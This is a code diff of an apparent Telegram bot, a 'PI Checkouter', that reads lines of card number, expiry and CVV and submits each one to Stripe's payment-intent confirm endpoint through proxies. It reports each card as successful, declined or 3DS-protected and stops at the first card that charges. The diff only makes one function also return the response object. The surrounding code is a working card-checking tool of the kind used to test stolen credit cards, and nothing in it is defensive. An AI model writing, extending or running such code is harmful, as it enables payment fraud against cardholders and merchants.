@@ -38,7 +38,7 @@ def pistuff(cc, mes, ano, cvv, pk, secretpi, proxies):
     if index != -1:
         pi = secretpi[:index]
     else:
-        return "Secret key not found in response.", False
+        return "Secret key not found in response.", False, None
 
     data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=skibidi+sigma+csub&payment_method_data[card][number]={cc}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={secretpi}'
     response = session.post(f'https://api.stripe.com/v1/payment_intents/{pi}/confirm', headers=headers, data=data, proxies=proxies)
@@ -49,11 +49,11 @@ def pistuff(cc, mes, ano, cvv, pk, secretpi, proxies):
     message = response_json.get("error", {}).get("message")
 
     if '"status": "succeeded"' in response.text:
-        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful", True)
+        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful", True, response)
     elif "requires_source_action" in response.text or "intent_confirmation_challenge" in response.text or "requires_action" in response.text:
-        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD", False)
+        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD", False, response)
     else:
-        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {code} | {decline_code} | {message}", False)
+        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {code} | {decline_code} | {message}", False, response)
 
 def handle_additional_steps(response, proxies, start_num, line_clean):
     if "declined" in response.text or "incorrect_number" in response.text or "Your card's expiration" in response.text or "expired_card" in response.text:
@@ -150,7 +150,7 @@ async def handle_cc(client, message):
 
     for i in content:
         cc, mes, ano, cvv = i.strip().split("|")
-        result, success = pistuff(cc, mes, ano, cvv, pk, cs, proxies=proxies)
+        result, success, response = pistuff(cc, mes, ano, cvv, pk, cs, proxies=proxies)
         await message.reply_text(result)
         if success:
             break
@@ -158,4 +158,4 @@ async def handle_cc(client, message):
         await message.reply_text(additional_message)
         if additional_success:
             break
-      
+            
